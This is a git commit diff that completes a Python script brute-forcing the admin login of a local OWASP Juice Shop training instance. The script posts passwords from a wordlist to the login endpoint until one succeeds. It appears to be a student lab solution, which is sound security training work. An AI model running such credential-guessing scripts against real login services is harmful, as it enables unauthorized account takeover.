f30978397398b9ebad1072413a35c52d5d3d7910
Laytongentleman <lnmt21@protonmail.com>
2025-11-27 16:20:42 +0100

    sol +

--- myBruteForce.py
+++ myBruteForce.py
@@ -1,16 +1,32 @@
 import requests
 from requests.structures import CaseInsensitiveDict
 
-url = ""
+url = "http://127.0.0.1:3000/rest/user/login"
 
 headers = CaseInsensitiveDict()
 headers["Content-Type"] = "application/json"
 
-data = '{}'
-print(data)
-r = requests.post(url, headers=headers, data=data, timeout=10)
-if r.status_code == 200:
-    print("Success")
+
+
+
+
+
+file_path = 'fourni/best1050.txt'
+
+with open(file_path, 'r') as file:
+    file_content = ''
+    line = file.readline()
+    
+    while line:
+        line = file.readline()
+
+        data = '{"email": "admin@juice-sh.op", "password": "' + line.strip() +'"}'
+        print(line) 
+        print(data)
+        r = requests.post(url, headers=headers, data=data, timeout=10)
+        if r.status_code == 200:
+            print("Success with password:", line.strip())
+            break
 
 # Basic
 print(r.status_code)
